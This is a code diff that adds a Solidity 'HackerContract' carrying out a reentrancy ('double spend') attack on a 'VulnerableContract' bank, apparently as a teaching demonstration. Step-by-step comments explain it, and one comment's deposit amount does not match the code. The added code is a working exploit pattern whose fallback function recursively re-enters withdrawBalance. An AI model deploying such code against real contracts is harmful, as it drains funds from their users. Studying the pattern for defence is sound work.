@@ -44,5 +44,51 @@ contract VulnerableContract{
 }
 
 contract HackerContract{
-    
+    /*This is the malicious contract that implements a double spend attack to the
+first contract: contract VulnerableContract. This attack can be carried out n times i.e. 
+till the time there is enough balance in the VulnerableContract.
+For this example, we carried it out only 2 times.*/
+
+   bool is_attack;
+   address hackerAddress;
+
+   function  HackerContract(address _hackerAddress, bool _is_attack){
+       hackerAddress = _hackerAddress;
+       is_attack = _is_attack;
+   }/*This function, which is the constructor, sets the address of the contract to be attacked
+   (contract Bank) and enables/disables the double spend attack */
+
+   function() {
+
+       if(is_attack==true)
+       {
+           is_attack=false;
+           if(hackerAddress.call(bytes4(sha3("withdrawBalance()")))) {
+               throw;
+           }
+       }
+   }/* This is the fallback function that calls the withdrawnBalance function 
+   when attack flag, previuosly set in the constructor, is enabled. This function
+   is triggered because in the withdrawBalance function of the contract Bank a
+   send was executed. To avoid infinitive recursive fallbacks, it is necessary
+   to set the variable is_attack to false. Otherwise, the gas would run out, the
+   throw would execute and the attack would fail */
+
+   function  deposit(){
+
+        if(hackerAddress.call.value(2).gas(20764)(bytes4(sha3("addToBalance()")))
+        ==false) {
+               throw;
+           }
+
+   }/*This function makes a deposit in the contract Bank (75 wei) calling the
+   addToBalance function of the contract Bank*/
+
+   function  withdraw(){
+
+        if(hackerAddress.call(bytes4(sha3("withdrawBalance()")))==false ) {
+               throw;
+           }
+
+   }/*This function triggers the withdrawBalance function in the contract Bank*/
 }
